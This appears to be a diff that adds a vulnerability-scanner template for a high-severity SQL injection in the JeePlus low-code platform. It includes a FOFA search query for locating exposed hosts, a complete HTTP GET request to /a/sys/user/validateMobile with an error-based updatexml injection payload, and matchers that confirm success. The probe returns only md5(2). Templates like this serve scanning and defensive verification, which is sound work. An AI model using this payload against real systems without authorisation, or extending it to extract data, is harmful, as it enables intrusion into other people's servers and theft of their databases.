@@ -1,0 +1,24 @@
+## id: VEID-2024-0601
+## name: JeePlus低代码开发平台存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: JeePlus低代码开发平台存在SQL注入漏洞
+## fofa-query: app="JeePlus"
+## verification: true
+
+
+
+GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%282%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: body contains "c81e728d9d4c2f636f067f89cc14862" && body contains "XPATH syntax error"
+
+
+
+
+# @VEIL-STAMP: d36b7546daef24d1b7399eab59f893ac974249c6b8a98f34983f3d5091ad58ae
